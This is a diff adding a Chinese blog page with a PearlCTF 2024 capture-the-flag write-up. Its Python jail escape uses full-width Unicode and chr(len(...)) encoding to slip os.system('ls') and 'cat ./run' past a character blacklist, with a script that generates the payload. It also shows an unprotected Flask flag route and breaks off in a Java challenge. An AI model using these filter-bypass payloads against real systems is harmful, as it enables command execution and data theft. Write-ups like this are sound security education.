@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="x5-fullscreen" content="true">
+<meta name="full-screen" content="yes">
+<meta name="theme-color" content="#317EFB" />
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
+<meta name="description" content="I am so vegetable 我太菜了 :-( b4by_jail一道简单的 Python 沙箱逃逸（指连我都会做），题目附件如下： 1234567891011121314151617181920212223242526#!&#x2F;usr&#x2F;local&#x2F;bin&#x2F;pythonimport timeflag&#x3D;&quot;pearl&#123;f4k3_fl4g&#125;&quot;blacklist&#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PearlCTF 2024 WP">
+<meta property="og:url" content="https://jackgdn.github.io/2024/03/10/Pearl2024/index.html">
+<meta property="og:site_name" content="-GDN&#39;s blog-">
+<meta property="og:description" content="I am so vegetable 我太菜了 :-( b4by_jail一道简单的 Python 沙箱逃逸（指连我都会做），题目附件如下： 1234567891011121314151617181920212223242526#!&#x2F;usr&#x2F;local&#x2F;bin&#x2F;pythonimport timeflag&#x3D;&quot;pearl&#123;f4k3_fl4g&#125;&quot;blacklist&#x3D;">
+<meta property="og:locale">
+<meta property="article:published_time" content="2024-03-10T00:02:43.738Z">
+<meta property="article:modified_time" content="2024-03-10T16:07:41.796Z">
+<meta property="article:author" content="JackGDN">
+<meta property="article:tag" content="Reverse">
+<meta property="article:tag" content="WP">
+<meta property="article:tag" content="Misc">
+<meta property="article:tag" content="Forensics">
+<meta name="twitter:card" content="summary">
+
+
+<title >PearlCTF 2024 WP</title>
+
+<!-- Favicon -->
+
+    <link href='/img/16.ico?v=2.1.10' rel='icon' type='image/png' sizes='16x16' ></link>
+
+
+    <link href='/img/32.ico?v=2.1.10' rel='icon' type='image/png' sizes='32x32' ></link>
+
+
+    <link href='/img/ico.jpg?v=2.1.10' rel='apple-touch-icon' sizes='180x180' ></link>
+
+
+    <link href='/img/G.png' rel='manifest' ></link>
+
+
+<!-- Plugin -->
+
+
+
+
+    
+<link rel="stylesheet" href="/css/plugins/bootstrap.row.css">
+
+    
+<link rel="stylesheet" href="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.css">
+
+    
+    
+<link rel="stylesheet" href="https://unpkg.com/katex@latest/dist/katex.min.css">
+
+
+
+
+
+<!-- Icon -->
+
+    
+<link rel="stylesheet" href="/css/plugins/font-awesome.min.css">
+
+
+
+
+<!-- Variable -->
+<script>window.ASYNC_CONFIG = {"hostname":"jackgdn.github.io","author":"JackGDN","root":"/","typed_text":["Per Aspera Ad Astra","无限风光在险峰","Aufhebung des Privateigentums.","The best people in life are free.","We never go out of style.","Cogito, ergo sum."],"theme_version":"2.1.10","theme":{"switch":true,"default":"auto"},"favicon":{"logo":"/img/GL.png","icon16":"/img/16.ico","icon32":"/img/32.ico","appleTouchIcon":"/img/ico.jpg","webmanifest":"/img/G.png","visibilitychange":true,"hidden":"/img/0.ico","showText":"Du bist wieder!","hideText":"Kommst jetzt hierher!","dark_logo":"/img/G.png"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":false,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","user_tag":"fas fa-user-alt","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"default","height_limit":false},"toc":{"post_title":true},"live_time":{"start_time":"02/26/2024 00:00:00","prefix":"GDN's Blog 已经运行 undefined 天"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"trigger":"auto","path":"search.xml"}};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-03-11 00:07:41"};</script>
+
+<!-- Theme mode css -->
+<link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.1.10" id="trm-switch-style">
+<script>
+    let defaultMode = ASYNC_CONFIG.theme.default !=='auto' ?  ASYNC_CONFIG.theme.default : (window.matchMedia("(prefers-color-scheme: light)").matches ? 'style-light' : 'style-dark')
+    let catchMode = localStorage.getItem('theme-mode') || defaultMode;
+    let type = catchMode === 'style-dark' ? 'add' : 'remove';
+    document.documentElement.classList[type]('dark')
+</script>
+
+<!-- CDN -->
+
+
+    
+    
+
+
+
+<!-- Site Analytics -->
+ 
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+
+  <!-- app wrapper -->
+  <div class="trm-app-frame">
+
+    <!-- page preloader -->
+    <div class="trm-preloader">
+    <div class="trm-holder">
+        <div class="preloader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+</div>
+    <!-- page preloader end -->
+
+    <!-- change mode preloader -->
+    <div class="trm-mode-swich-animation-frame">
+    <div class="trm-mode-swich-animation">
+        <i class="i-sun"><i class="iconfont far fa-sun"></i></i>
+        <div class="trm-horizon"></div>
+        <i class="i-moon"><i class="iconfont far fa-moon"></i></i>
+    </div>
+</div>
+    <!-- change mode preloader end -->
+
+      <!-- scroll container -->
+      <div id="trm-dynamic-content" class="trm-swup-animation">
+        <div id="trm-scroll-container" class="trm-scroll-container" style="opacity: 0">
+            <!-- top bar -->
+            <header class="trm-top-bar">
+	<div class="container">
+		<div class="trm-left-side">
+			<!-- logo -->
+<a href="/" class="trm-logo-frame trm-anima-link">
+    
+        <img alt="logo" class=" trm-light-icon" src="/img/GL.png"> <img alt="logo" class=" trm-dark-icon" src="/img/G.png">
+    
+    
+        <div class="trm-logo-text">
+            GDN&#39;s <span>Blog</span>
+        </div>
+    
+</a>
+<!-- logo end -->
+		</div>
+		<div class="trm-right-side">
+			<!-- menu -->
+<div class="trm-menu">
+    <nav>
+        <ul>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/" target="">
+                    首页
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/archives/" target="">
+                    归档
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/categories/" target="">
+                    分类
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/tags/" target="">
+                    标签
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/links/" target="">
+                    链接
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/abou/" target="">
+                    关于
+                </a>
+                
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+<!-- menu end -->
+			
+    <!-- mode switcher place -->
+    <div class="trm-mode-switcher-place">
+        <div class="trm-mode-switcher">
+            <i class="iconfont far fa-sun"></i>
+            <input class="tgl tgl-light" id="trm-swich" type="checkbox">
+            <label class="trm-swich" for="trm-swich"></label>
+            <i class="iconfont far fa-moon"></i>
+        </div>
+    </div>
+    <!-- mode switcher place end -->
+
+			
+    
+    <div id="trm-search-btn" class="trm-search-btn">
+        <i class="iconfont fas fa-search"></i>
+    </div>
+     
+
+		</div>
+		<div class="trm-menu-btn">
+			<span></span>
+		</div>
+	</div>
+</header>
+            <!-- top bar end -->
+
+            <!-- body -->
+            
+<div class="trm-content-start">
+    <!-- banner -->
+    <div class="trm-banner">
+    
+    <!-- banner cover -->
+    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" src="/img/index.jpg">
+    <!-- banner cover end -->
+    
+
+    <!-- banner content -->
+    <div class="trm-banner-content trm-overlay">
+        <div class="container">
+            <div class="row">
+                
+                <div class="col-lg-4"></div>
+                
+                <div class="col-lg-8">
+
+                    <!-- banner title -->
+                    <div class="trm-banner-text ">
+                        <div class="trm-label trm-mb-20">
+                            贡献分数 908/1807
+                        </div>
+                        <h1 class="trm-mb-30 trm-hsmb-font">
+                            PearlCTF 2024 WP
+                        </h1>
+
+                        
+                            <ul class="trm-breadcrumbs trm-label">
+                                <li>
+                                    <a href="/" class="trm-anima-link">Home</a>
+                                </li>
+                                <li>
+                                    <span>
+                                        2024
+                                    </span>
+                                </li>
+                            </ul>
+                        
+                    </div>
+                    <!-- banner title end -->
+
+                    <!-- scroll hint -->
+                    <span id="scroll-triger" class="trm-scroll-hint-frame">
+                        <div class="trm-scroll-hint"></div>
+                        <span class="trm-label">Scroll down</span>
+                    </span>
+                    <!-- scroll hint end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- banner content end -->
+</div>
+    <!-- banner end -->
+    <div class="container">
+        <div class="row">
+            
+                <div class="trm-page-sidebar col-lg-4 hidden-sm">
+                    <!-- main card -->
+                    <div class="trm-main-card-frame trm-sidebar">
+    <div class="trm-main-card"> 
+        <!-- card header -->
+<div class="trm-mc-header">
+    <div class="trm-avatar-frame trm-mb-20">
+        <img alt="Avatar" class="trm-avatar" src="/img/ico.jpg">
+    </div>
+    <h5 class="trm-name trm-mb-15">
+        jack_gdn
+    </h5>
+    
+        <div class="trm-label">
+            
+            <span class="trm-typed-text">
+                <!-- Words for theme.user.typedText -->
+            </span>
+        </div>
+    
+</div>
+<!-- card header end -->
+        <!-- sidebar social -->
+
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<div class="trm-social">
+    
+        <a href="https://github.com/jackgdn/" title="Github" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-github"></i>
+        </a>
+    
+        <a href="https://discordapp.com/users/1197744806026280980" title="Discord" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-discord"></i>
+        </a>
+    
+</div>
+
+<!-- sidebar social end -->
+        <!-- info -->
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<ul class="trm-table trm-mb-20">
+    
+        <li>
+            <div class="trm-label">
+                IP 属地:
+            </div>
+            <div class="trm-label trm-label-light">
+                朝鲜
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                居住地:
+            </div>
+            <div class="trm-label trm-label-light">
+                Arrakis
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                年龄:
+            </div>
+            <div class="trm-label trm-label-light">
+                未知
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                性别:
+            </div>
+            <div class="trm-label trm-label-light">
+                武装直升机
+            </div>
+        </li>
+    
+</ul>
+<!-- info end -->
+
+        
+    <div class="trm-divider trm-mb-40 trm-mt-40"></div>
+    <!-- action button -->
+    <div class="text-center">
+        <a href="mailto:li_chungyao@outlook.com" class="trm-btn">
+            Contact Me
+            <i class="iconfont far fa-envelope"></i>
+        </a>
+    </div>
+    <!-- action button end -->
+
+    </div>
+</div>
+                    <!-- main card end -->
+                </div>
+            
+            <div class="trm-page-content col-lg-8">
+                <div id="trm-content" class="trm-content">
+                    <div class="trm-post-info row hidden-sm">
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
+            03/10
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-clock trm-icon"></i><br>
+            08:02
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-user trm-icon"></i><br>
+            JackGDN
+        </div>
+    </div>
+</div>
+<div class="trm-card ">
+    <article id="article-container" class="trm-publication">
+    <p>I am so vegetable 我太菜了 :-(</p>
+<h1 id="b4by-jail"><a href="#b4by-jail" class="headerlink" title="b4by_jail"></a>b4by_jail</h1><p>一道简单的 Python 沙箱逃逸（指连我都会做），题目附件如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=<span class="string">&quot;pearl&#123;f4k3_fl4g&#125;&quot;</span></span><br><span class="line">blacklist=<span class="built_in">list</span>(<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~`![]&#123;&#125;,&lt;&gt;/123456789&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    file=<span class="built_in">open</span>(<span class="string">&quot;txt.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    <span class="built_in">print</span>(file)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_blocklist</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    banner()</span><br><span class="line">    cmd=<span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(check_blocklist(cmd)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">eval</span>(cmd))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Sorry no valid output to show.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Your sentence has been increased by 2 years for attempted escape.&quot;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>所有的字母都被屏蔽，部分符号被屏蔽，数字仅 0 可用，因此想到使用 Unicode 特殊字符绕过。把 <code>__import__(&#39;os&#39;).system(&#39;ls&#39;)</code> 的全部字母都换成全角字符：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__ｉｍｐｏｒｔ__(<span class="string">&#x27;ｏｓ&#x27;</span>).ｓｙｓｔｅｍ(<span class="string">&#x27;ｌｓ&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ModuleNotFoundError: No module named <span class="string">&#x27;ｏｓ&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据 web 师傅的经验，在进行 SSTI 注入时，模块名只能使用原字符。同时由于 Linux 操作系统的限制，<code>os.system()</code> 中的指令也只能使用原字符。因此我们使用下面的方法作为修改过的载荷：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__ｉｍｐｏｒｔ__(ｃｈｒ(ｌｅｎ(<span class="string">&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>))).ｓｙｓｔｅｍ(ｃｈｒ(ｌｅｎ(<span class="string">&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;00000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;0000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;00000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>其中的 “os” 与 “ls” 都使用 0 的数量表示，最终拼凑出来的是原字符。通过这个载荷可以看到 flag 所在的文件：<code>./run</code>。随后将载荷中的 “ls” 改为 “cat .&#x2F;run” 得到 flag。修改后的载荷如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__ｉｍｐｏｒｔ__(ｃｈｒ(ｌｅｎ(<span class="string">&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>))).ｓｙｓｔｅｍ(ｃｈｒ(ｌｅｎ(<span class="string">&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;00000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;0000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;00000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>修改载荷的脚本（用于将字符使用 0 的数量表示）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">d = <span class="string">&quot;cat ./run&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    s += <span class="string">&quot;ｃｈｒ(ｌｅｎ(&#x27;&quot;</span></span><br><span class="line">    s += <span class="built_in">ord</span>(i) * <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    s += <span class="string">&quot;&#x27;)) + &quot;</span></span><br><span class="line"><span class="built_in">print</span>(s[:-<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># output: ｃｈｒ(ｌｅｎ(&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;)) + ｃｈｒ(ｌｅｎ(&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;)) + ｃｈｒ(ｌｅｎ(&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;)) + ｃｈｒ(ｌｅｎ(&#x27;00000000000000000000000000000000&#x27;)) + ｃｈｒ(ｌｅｎ(&#x27;0000000000000000000000000000000000000000000000&#x27;)) + ｃｈｒ(ｌｅｎ(&#x27;00000000000000000000000000000000000000000000000&#x27;)) + ｃｈｒ(ｌｅｎ(&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;)) + ｃｈｒ(ｌｅｎ(&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;)) + ｃｈｒ(ｌｅｎ(&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;))</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="TooRandom"><a href="#TooRandom" class="headerlink" title="TooRandom"></a>TooRandom</h1><p>能解出这道题就是 too random。下面是题目源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&quot;secret_key&quot;</span></span><br><span class="line"></span><br><span class="line">seed = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">random.seed(seed)</span><br><span class="line">flag_no = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_user_ids</span>():</span><br><span class="line">    <span class="keyword">global</span> flag_no</span><br><span class="line">    random_numbers = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        random_number = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">        random_numbers.append(random_number)</span><br><span class="line">    flag_no = random_numbers[-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag_no)</span><br><span class="line">    st_id = <span class="number">624</span></span><br><span class="line">    end_id = <span class="number">999999</span></span><br><span class="line">    <span class="keyword">del</span> random_numbers[st_id:end_id]</span><br><span class="line">    <span class="keyword">return</span> random_numbers</span><br><span class="line"></span><br><span class="line">user_ids = generate_user_ids()</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/dashboard&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    <span class="keyword">global</span> j</span><br><span class="line">    id_no = user_ids[j%<span class="number">624</span>]</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        number = <span class="built_in">int</span>(request.form[<span class="string">&#x27;number&#x27;</span>])</span><br><span class="line">        <span class="keyword">if</span> number == flag_no:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/flagkeeper&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/wrongnumber&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, number=id_no)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flagkeeper&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flagkeeper_dashboard</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;flag_keeper.html&#x27;</span>, user_id=flag_no)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/wrongnumber&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wrong_number</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;wrong_number.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>题目需要开启实例，进去后会让用户输入一个随机数：</p>
+<p>![](“D:\ProgramData\Github Pages\node_modules\hexo-theme-async\source\img\Pearl2024\image.png”)</p>
+<p>此页面为 <code>/dashboard</code>。如果随便输入一个数，大概率会错误，然后进入一个错误页面：</p>
+<p>![](“D:\ProgramData\Github Pages\node_modules\hexo-theme-async\source\img\Pearl2024\image-1.png”)</p>
+<p>此时页面为 <code>/wrongnumber</code>。根据题目给出代码中的逻辑，如果输入数字错误，则会进入 <code>/wrongnumber</code>，否则进入 <code>/flagkeeper</code>，因此尝试直接进入 <code>/flagkeeper</code>：</p>
+<p>![](“D:\ProgramData\Github Pages\node_modules\hexo-theme-async\source\img\Pearl2024\image-2.png”)</p>
+<p>噫！我中了！网页竟然连个保护都没有，应该是非预期解了。</p>
+<h1 id="input-validator"><a href="#input-validator" class="headerlink" title="input_validator"></a>input_validator</h1><p>题目附件是一个 Java 类，反编译得到：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 